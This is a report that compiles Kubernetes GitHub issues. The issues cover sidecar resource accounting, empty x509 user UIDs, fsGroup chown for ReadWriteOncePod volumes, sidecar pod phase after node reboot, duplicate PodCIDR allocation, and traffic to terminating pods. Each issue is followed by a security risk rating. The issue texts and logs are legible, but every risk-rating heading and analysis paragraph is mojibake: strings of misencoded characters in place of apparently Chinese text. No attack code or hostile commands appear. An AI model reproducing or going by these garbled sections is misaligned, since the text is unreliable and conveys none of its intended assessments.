#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡ºï¼Œåœ¨Kubernetesä¸­ï¼Œå½“ä½¿ç”¨sidecarå®¹å™¨æ—¶ï¼Œè°ƒåº¦å™¨åœ¨è®¡ç®—Podçš„èµ„æºè¯·æ±‚æ—¶ï¼Œæœªæ­£ç¡®è€ƒè™‘sidecarå®¹å™¨çš„èµ„æºï¼Œå¯¼è‡´èµ„æºè®¡ç®—ä¸å‡†ç¡®ã€‚

æ ¹æ®Sidecars KEPï¼Œèµ„æºè®¡ç®—åº”è¯¥æ˜¯ï¼šResource Requests = Max ( Max(each InitContainerUse), Sum(Sidecar Containers) + Sum(Containers) )ã€‚

ä½†æ˜¯è°ƒåº¦å™¨çš„é€»è¾‘ä½¿ç”¨äº† Max(RegularContainers, InitContainers) æ¥è®¡ç®—èµ„æºï¼Œæ²¡æœ‰æ­£ç¡®åœ°å°†Sidecar Containersçš„èµ„æºè®¡å…¥ã€‚

è¿™å¯èƒ½å¯¼è‡´Podè°ƒåº¦åˆ°èµ„æºä¸è¶³çš„èŠ‚ç‚¹ï¼Œé€ æˆèŠ‚ç‚¹èµ„æºè¶…è½½ï¼Œå¯èƒ½å¼•å‘æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰é£é™©ã€‚

ç„¶è€Œï¼Œè¦åˆ©ç”¨è¿™ä¸€é—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åœ¨é›†ç¾¤ä¸­åˆ›å»ºç‰¹å®šPodçš„æƒé™ï¼Œå³éœ€è¦ä¸€å®šçš„æƒé™ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ä¸­çš„ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

å› æ­¤ï¼Œè¯¥Issueæ¶‰åŠåˆ°çš„å®‰å…¨é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #127860 x509 clients missing User.Uid info for authorization and admission

- Issue é“¾æ¥ï¼š[#127860](https://github.com/kubernetes/kubernetes/issues/127860)

### Issue å†…å®¹

#### What happened?

For all other authenticator types, the authenticator supplies a UID for the user. When an authorizer or admission validator evaluates a request, the uid for x509 users is an empty string.

#### What did you expect to happen?

I expected a UID to be populated by the x509 authenticator if set in the certificate. I'd also expect `kubeadm` to have a flag in the `kubeadm kubeconfig user` subcommand to support setting it like `--client-name` and `--org` populate username and groups respectively, so something like `--client-uid`. 

For Kubernetes-created node client certs should probably have the node object's `uid`. Other client x509 certs such as Kube-apiserver client cert for node proxy or client certs from the CSR  API, its not clear if/what Kubernetes should set. 



#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a [kind](https://kind.sigs.k8s.io/) cluster
2. Run `kubectl auth whoami`. No UID is returned as it is for other auth formats

```
kubectl auth whoami
ATTRIBUTE   VALUE
Username    kubernetes-admin
Groups      [kubeadm:cluster-admins system:authenticated]
```


#### Anything else we need to know?

As [discussed in #sig-auth](https://kubernetes.slack.com/archives/C0EN96KUY/p1727984474325949), x509 has an optional field for UID. Go's `crypto/x509` doesn't have a named field for it, but it can be set or accessed. 


#### Kubernetes version

All versions

#### Cloud provider

N/A

#### OS version

N/A

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
- **é—®é¢˜æè¿°**ï¼šåœ¨ Kubernetes ä¸­ï¼Œå½“ä½¿ç”¨ x509 è¯ä¹¦è¿›è¡Œèº«ä»½è®¤è¯æ—¶ï¼Œè®¤è¯å™¨ä¸ä¼šä¸ºç”¨æˆ·æä¾› UID ä¿¡æ¯ã€‚è€Œå…¶ä»–ç±»å‹çš„è®¤è¯å™¨ä¼šä¸ºç”¨æˆ·æä¾› UIDã€‚å½“æˆæƒå™¨æˆ–å‡†å…¥æ§åˆ¶å™¨è¯„ä¼°è¯·æ±‚æ—¶ï¼Œx509 ç”¨æˆ·çš„ UID ä¸ºç©ºå­—ç¬¦ä¸²ã€‚

- **å¯èƒ½çš„å®‰å…¨å½±å“**ï¼šç”±äº x509 ç”¨æˆ·çš„ UID ä¸ºç©ºï¼Œåœ¨æŸäº›ä¾èµ– UID è¿›è¡Œæƒé™æ§åˆ¶ã€è®¿é—®æ§åˆ¶æˆ–å®¡è®¡çš„åœºæ™¯ä¸­ï¼Œå¯èƒ½å¯¼è‡´æ— æ³•å‡†ç¡®è¯†åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è€Œå¯èƒ½å­˜åœ¨æƒé™æå‡æˆ–ç»•è¿‡å®‰å…¨ç­–ç•¥çš„é£é™©ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½å†’å……å…¶ä»–ç”¨æˆ·ï¼Œæˆ–æ— æ³•åœ¨å®¡è®¡æ—¥å¿—ä¸­å‡†ç¡®è¿½è¸ªç”¨æˆ·æ“ä½œã€‚

- **é£é™©è¯„ä¼°**ï¼šè¯¥é—®é¢˜å¯èƒ½ä¼šå½±å“åˆ°ä¾èµ– UID è¿›è¡Œç²¾ç»†åŒ–æƒé™æ§åˆ¶çš„è‡ªå®šä¹‰ç»„ä»¶æˆ–ç¬¬ä¸‰æ–¹æ’ä»¶ï¼Œä½†åœ¨é»˜è®¤é…ç½®ä¸‹ï¼ŒKubernetes ä¸»è¦ä½¿ç”¨ç”¨æˆ·åå’Œç”¨æˆ·ç»„è¿›è¡Œæƒé™ç®¡ç†ï¼ŒUID çš„ç¼ºå¤±ä¸€èˆ¬ä¸ä¼šç›´æ¥å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚é‰´äºæ”»å‡»è€…æ— æ³•ç›´æ¥åˆ©ç”¨è¯¥ç¼ºé™·è¿›è¡Œæ”»å‡»ï¼Œä¸”éœ€è¦ç‰¹å®šçš„ä¾èµ–æ¡ä»¶ï¼Œå› æ­¤å°†é£é™©è¯„çº§å®šä¸ºä½é£é™©ã€‚

---

## Issue #127817 FsGroupPolicy ReadWriteOnceWithFSType should apply to ReadWriteOncePod access mode

- Issue é“¾æ¥ï¼š[#127817](https://github.com/kubernetes/kubernetes/issues/127817)

### Issue å†…å®¹

#### What happened?

The recursive `chown` behavior that kubelet does for RWO volume access mode with FsGroupPolicy `ReadWriteOnceWithFSType` is not applied for RWOP access mode.  Since RWOP is even more restrictive than RWO, there should be no issues extending this default behavior to RWOP.

#### What did you expect to happen?

When a persistent volume is attached by a CSI provisioner that advertises an FsGroupPolicy of `ReadWriteOnceWithFSType`, kubelet should do a recursive `chown` to apply the Fsgroup from a pod SecurityContext for RWOP access mode.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Install CSI provisioner with FsGroupPolicy of `ReadWriteOnceWithFSType` (the default).
2. Create minimal matching storage class with non-empty `fsType` parameter.
3. Create a PVC/PV with `ReadWriteOncePod` access mode.
4. Create a pod with a securityContext having `fsGroup` value.
5. Observe that kubelet does not perform the recursive `chown` on the files in the attached PV.

#### Anything else we need to know?

This fix could be a one-line change here:
https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/volume/csi/csi_mounter.go#L474

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
$ uname -a
Linux node1 5.4.0-186-generic #206-Ubuntu SMP Fri Apr 26 12:31:10 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
N/A
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CSI: https://github.com/NetApp/trident
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
Kubernetes åœ¨æŒ‚è½½å…·æœ‰ FsGroupPolicy ä¸º `ReadWriteOnceWithFSType` çš„æŒä¹…å·æ—¶ï¼Œé’ˆå¯¹è®¿é—®æ¨¡å¼ä¸º `ReadWriteOnce`ï¼ˆRWOï¼‰çš„å·ï¼Œkubelet ä¼šæ‰§è¡Œé€’å½’çš„ `chown` æ“ä½œï¼Œä»¥åº”ç”¨æ¥è‡ª Pod `SecurityContext` ä¸­çš„ `fsGroup`ã€‚ç„¶è€Œï¼Œå¯¹äºè®¿é—®æ¨¡å¼ä¸º `ReadWriteOncePod`ï¼ˆRWOPï¼‰çš„å·ï¼Œkubelet å¹¶æœªæ‰§è¡Œè¯¥é€’å½’ `chown` æ“ä½œã€‚

è¿™å¯èƒ½å¯¼è‡´ä½¿ç”¨ RWOP è®¿é—®æ¨¡å¼çš„ Pod æ— æ³•æ­£ç¡®è®¾ç½®å·ä¸­æ–‡ä»¶çš„æƒé™ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä»¥ä¸‹å®‰å…¨é£é™©ï¼š

1. **æƒé™ä¸è¶³**ï¼šPod å†…çš„è¿›ç¨‹å¯èƒ½æ— æ³•è®¿é—®å·ä¸­æ–‡ä»¶ï¼Œå½±å“åº”ç”¨æ­£å¸¸è¿è¡Œã€‚
2. **æƒé™è¿‡é«˜**ï¼šå¦‚æœå·ä¸­æ–‡ä»¶çš„æƒé™æœªè¢«æ­£ç¡®è®¾ç½®ï¼Œå¯èƒ½é»˜è®¤å…·æœ‰è¾ƒé«˜çš„æƒé™ï¼Œæ½œåœ¨åœ°å…è®¸ä¸åº”æœ‰çš„è®¿é—®ã€‚

ä½†æ˜¯ï¼Œä»¥ä¸Šé£é™©éœ€è¦å…·å¤‡å¯¹ Kubernetes é›†ç¾¤çš„æ“ä½œæƒé™æ‰èƒ½è§¦å‘ï¼Œæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿåˆ›å»ºæˆ–ä¿®æ”¹ Pod çš„æƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSS è¯„çº§åœ¨ high ä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜å­˜åœ¨ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œä½†ä¸å±äºé«˜é£é™©æ¼æ´ã€‚

---

## Issue #127793 [SidecarContainers] Failed to get proper phase after the node reboot

- Issue é“¾æ¥ï¼š[#127793](https://github.com/kubernetes/kubernetes/issues/127793)

### Issue å†…å®¹

#### What happened?

If a pod has an init container with restartPolicy "Always" (sidecar), it may lose the pending phase after the node reboot and start the regular containers before initializing the init containers.

/sig node
/priority important-soon
/kind bug

This is similar to https://github.com/kubernetes/kubernetes/issues/126650, but separated as it only affects the pod with restartable init containers.

#### What did you expect to happen?

After the node reboot, the remaining pod should start from the pending phase and run the init containers one by one to initialize.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create and initialize the pod with an init container with "Always" container restart policy.
2. Restart the node.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetesä¸­çš„ä¸€ä¸ªé—®é¢˜ï¼šå½“ä¸€ä¸ªPodåŒ…å«restartPolicyä¸º"Always"çš„initå®¹å™¨ï¼ˆå³sidecarå®¹å™¨ï¼‰æ—¶ï¼Œå¦‚æœèŠ‚ç‚¹é‡å¯ï¼ŒPodå¯èƒ½ä¼šè·³è¿‡initå®¹å™¨çš„æ‰§è¡Œï¼Œç›´æ¥å¯åŠ¨ä¸»å®¹å™¨ã€‚è¿™å¯èƒ½å¯¼è‡´ä¸»å®¹å™¨åœ¨æœªç»è¿‡æ­£ç¡®åˆå§‹åŒ–çš„æƒ…å†µä¸‹å¯åŠ¨ï¼Œå¯èƒ½å¼•å‘åº”ç”¨ç¨‹åºçš„ä¸æ­£ç¡®è¡Œä¸ºã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œå¦‚æœinitå®¹å™¨è´Ÿè´£æ‰§è¡Œå®‰å…¨åˆå§‹åŒ–æ“ä½œï¼ˆä¾‹å¦‚é…ç½®å®‰å…¨ç­–ç•¥ã€åŠ è½½å®‰å…¨è¯ä¹¦ç­‰ï¼‰ï¼Œè·³è¿‡è¿™äº›æ­¥éª¤å¯èƒ½å¯¼è‡´ä¸»å®¹å™¨åœ¨ä¸å®‰å…¨çš„çŠ¶æ€ä¸‹è¿è¡Œã€‚ç„¶è€Œï¼Œè¿™ä¸€é—®é¢˜éœ€è¦èŠ‚ç‚¹é‡å¯æ‰èƒ½è§¦å‘ï¼Œä¸”èŠ‚ç‚¹é‡å¯é€šå¸¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ™®é€šæ”»å‡»è€…æ— æ³•è½»æ˜“è§¦å‘ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1. æ”»å‡»è€…éš¾ä»¥åˆ©ç”¨è¯¥é£é™©ï¼ˆç¬¬1æ¡ï¼‰ã€‚
4. æ”»å‡»éœ€è¦ä¸€å®šæƒé™ï¼Œæ•…åº”é™ä½é£é™©è¯„çº§ï¼ˆç¬¬4æ¡ï¼‰ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueå­˜åœ¨ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œä½†ç”±äºæ”»å‡»è€…éš¾ä»¥åˆ©ç”¨ï¼Œé£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #127792 kube-controller-manager re-allocating already used PodCIDR (v1.31)

- Issue é“¾æ¥ï¼š[#127792](https://github.com/kubernetes/kubernetes/issues/127792)

### Issue å†…å®¹

#### What happened?

Since upgrading to Kubernetes v1.31 we have occasional observed that `kube-controller-manager` allocates a PodCIDR for a new node which is already allocated for an existing node in the cluster. We have about 200 clusters with a combined number of ca. 6k-10k nodes (autoscaling). It has happened about 10 times since upgrading a week ago, so it's rather rare but breaks the networking between the affected nodes when it happens.

We use flannel as overlay network and it uses the podCIDR assigned by `kube-controller-manager`. When a new node gets an existing podCIDR assigned, then the new node doesn't get ready and it gets terminated after 10 min. We check that the node is routable by all other nodes before we mark the node ready. This never happens because the podCIDR already points to another node in the cluster. When the new node is deleted it has the very unfortunate side effect that all flannels detect the node is deleted and they delete the routes for the podCIDR, problem is just that most nodes will have routes for the other node with the same podCIDR and this then stops working.

Terminating the affected node is the best way to resolve the issue but obviously not sustainable.

#### What did you expect to happen?

`kube-controller-manager` should _never_ allocate the same podCIDR to multiple nodes at the same time.

#### How can we reproduce it (as minimally and precisely as possible)?

We haven't found a predictable way to reproduce it.

We run with the pod CIDR range: `10.2.0.0/15`.

#### Anything else we need to know?

This is how we configure `kube-controller-manager`: https://github.com/zalando-incubator/kubernetes-on-aws/blob/dev/cluster/node-pools/master-default/userdata.yaml#L581-L648 (the image is vanilla Kubernetes built from source and hosted in a private registry)

Here is an example from one cluster with logs:

*Node 1 (original)*:
name: `ip-172-31-14-210.eu-central-1.compute.internal`
podCIDR: `10.2.4.0/24`

*Node 2 (new)*:
name: `ip-172-31-15-241.eu-central-1.compute.internal`
podCIDR: `10.2.4.0/24`

`kube-controller-manager`  logs filtered for the node `ip-172-31-14-210.eu-central-1.compute.internal`:

```
I1001 16:54:22.944453       1 actual_state_of_world.go:540] "Failed to update statusUpdateNeeded field in actual state of world" logger="persistentvolume-attach-detach-controller" err="Failed to set statusUpdateNeeded to needed true, because nodeName=\"ip-172-31-14-210.eu-central-1.compute.internal\" does not exist"
I1001 16:54:23.001587       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 16:54:23.054817       1 node_lifecycle_controller.go:884] "Missing timestamp for Node. Assuming now as a timestamp" logger="node-lifecycle-controller" node="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 16:56:52.839072       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:01:57.639919       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:03:00.584960       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:03:19.873337       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:08:26.273278       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:13:32.137435       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:18:37.436066       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:20:50.207426       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:06.023052       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:06.058496       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:11.270715       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:11.376488       1 reconciler.go:275] "attacherDetacher.DetachVolume started" logger="persistentvolume-attach-detach-controller" node="ip-172-31-14-210.eu-central-1.compute.internal" volumeName="kubernetes.io/csi/ebs.csi.aws.com^vol-01a06d931a5cbc177"
I1001 17:22:11.386310       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:11.392521       1 operation_generator.go:1539] Verified volume is safe to detach for volume "pvc-0ecc2568-e98d-430d-aa57-d545f7cb8c85" (UniqueName: "kubernetes.io/csi/ebs.csi.aws.com^vol-01a06d931a5cbc177") on node "ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:22:18.918976       1 operation_generator.go:437] DetachVolume.Detach succeeded for volume "pvc-0ecc2568-e98d-430d-aa57-d545f7cb8c85" (UniqueName: "kubernetes.io/csi/ebs.csi.aws.com^vol-01a06d931a5cbc177") on node "ip-172-31-14-210.eu-central-1.compute.internal"
I1001 17:23:15.637313       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
```

`kube-controller-manager` logs filtered for the node: `ip-172-31-15-241.eu-central-1.compute.internal`:

```
I1001 17:22:45.543797       1 actual_state_of_world.go:540] "Failed to update statusUpdateNeeded field in actual state of world" logger="persistentvolume-attach-detach-controller" err="Failed to set statusUpdateNeeded to needed true, because nodeName=\"ip-172-31-15-241.eu-central-1.compute.internal\" does not exist"
I1001 17:22:45.647668       1 range_allocator.go:422] "Set node PodCIDR" logger="node-ipam-controller" node="ip-172-31-15-241.eu-central-1.compute.internal" podCIDRs=["10.2.4.0/24"]
I1001 17:22:45.648019       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.648088       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.695174       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.702231       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.724468       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.752257       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.820108       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:45.846131       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:22:48.640513       1 node_lifecycle_controller.go:884] "Missing timestamp for Node. Assuming now as a timestamp" logger="node-lifecycle-controller" node="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:02.216555       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:02.273556       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:16.215529       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:21.763576       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:23:46.683733       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:25:05.756696       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
I1001 17:25:05.786234       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-15-241.eu-central-1.compute.internal"
```

The interesting lines are:

```
I1001 16:54:23.001587       1 range_allocator.go:241] "Successfully synced" logger="node-ipam-controller" key="ip-172-31-14-210.eu-central-1.compute.internal"
...
I1001 17:22:45.647668       1 range_allocator.go:422] "Set node PodCIDR" logger="node-ipam-controller" node="ip-172-31-15-241.eu-central-1.compute.internal" podCIDRs=["10.2.4.0/24"]
```

At `16:54` the original node is `Successfully synced` by the `node-ipam-controller` and at `17:22`, much later, does the new node get the same podCIDR allocated as what is already allocated to the original node.

We can also see this from the flannel logs on the new node:

```
 time="2024-10-01T17:22:58Z" level=info msg="Added new node ip-172-31-14-210.eu-central-1.compute.internal with PodCIDR 10.2.4.0/24, address 10.2.4.0"
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
AWS running a custom Kubernetes setup on EC2
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools


<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetes v1.31ç‰ˆæœ¬ä¸­ï¼Œ`kube-controller-manager`å¯èƒ½ä¼šå°†å·²ç»åˆ†é…ç»™ç°æœ‰èŠ‚ç‚¹çš„PodCIDRå†æ¬¡åˆ†é…ç»™æ–°èŠ‚ç‚¹ï¼Œå¯¼è‡´ç½‘ç»œå†²çªå’Œä¸­æ–­ã€‚è¿™ä¼šå¼•èµ·é›†ç¾¤å†…çš„ç½‘ç»œé€šä¿¡é—®é¢˜ï¼Œå½±å“æœåŠ¡çš„å¯ç”¨æ€§ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´ï¼Œæ•…æ„è§¦å‘PodCIDRé‡å¤åˆ†é…ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ç„¶è€Œï¼Œå®æ–½æ­¤æ”»å‡»éœ€è¦æ”»å‡»è€…å…·æœ‰åˆ›å»ºæˆ–åˆ é™¤èŠ‚ç‚¹çš„æƒé™ï¼Œè¿™é€šå¸¸æ˜¯ç®¡ç†å‘˜æˆ–é«˜çº§åˆ«ç”¨æˆ·æƒé™ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†çš„ç¬¬4æ¡ï¼Œå¯¹äºæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™ï¼ˆå¦‚åˆ›å»ºã€ä¿®æ”¹æƒé™ï¼‰æ‰èƒ½å®æ–½æ”»å‡»ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œæ­¤é—®é¢˜çš„é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

# âœ… ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issues (56 ä¸ª)

## Issue #128479 Pod in terminating state, Kubernetes EndpointSlice shows pod as running: false, but pod still getting traffic after 120 sec.

- Issue é“¾æ¥ï¼š[#128479](https://github.com/kubernetes/kubernetes/issues/128479)

### Issue å†…å®¹

#### What happened?

When doing rolling deployment of a spring boot app, with 120sec pre stop. There is another active pod up and running.
EndpointSlice show this terminating pod as running:false and but in EndpointSlice ips we still see this terminating pod. But it has been removed from service endpoint immediately. Why is the pod in terminating state getting traffic when there is another active pod to receive traffic?

We have an alb ingress controller with instance type and Kubernetes service with node-port type.
We are continuously simulating traffic from a postman client during rolling deployment. And we are getting few 502 errors as the pod in terminating state getting traffic all the while when it is running pre-stop and after that as well.
here is snippet from deployment yaml
```
          lifecycle:
            preStop:
              exec:
                command:
                  - /bin/sh
                  - -c
                  - sleep 120
          livenessProbe:
            httpGet:
              path: /actuator/health/liveness
              port: 8080
            initialDelaySeconds: 60
            periodSeconds: 30
          readinessProbe:
            httpGet:
              path: /actuator/health/readiness
              port: 8080
            initialDelaySeconds: 60
            periodSeconds: 30
   terminationGracePeriodSeconds: 150
```

Below are details from kubectl
```
Endpoints:
  - Addresses:  10.0.153.241
    Conditions:
      Ready:    true
    Hostname:   <unset>
    TargetRef:  Pod/demo-5ccf6cd66c-jpcxh
    NodeName:   ip-10-0-147-87.ec2.internal
    Zone:       us-east-1a
  - Addresses:  10.0.216.8
    Conditions:
      Ready:    true
    Hostname:   <unset>
    TargetRef:  Pod/demo-5ccf6cd66c-tvk46
    NodeName:   ip-10-0-204-238.ec2.internal
    Zone:       us-east-1b
  - Addresses:  10.0.247.50
    Conditions:
      Ready:    false
    Hostname:   <unset>
    TargetRef:  Pod/demo-7c8d47c64f-n7vvp
    NodeName:   ip-10-0-219-33.ec2.internal
    Zone:       us-east-1b
Events:         <none>
```

```
% kubectl get endpointslice -n demo-jj         
NAME                ADDRESSTYPE   PORTS   ENDPOINTS                             AGE
demo-jj  IPv4          8080    10.0.153.241,10.0.216.8,10.0.247.50   220d
```

#### What did you expect to happen?

Terminating pod should be removed from EndpointSlice when it is running pre-stop.

#### How can we reproduce it (as minimally and precisely as possible)?

A spring boot app with above deployment yaml and alb ingress controller should reproduce this while rolling deployment. And simulate traffic through postman performance testing.

#### Anything else we need to know?

_No response_

#### Kubernetes version


<details>v1.29.8-eks-a737599</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

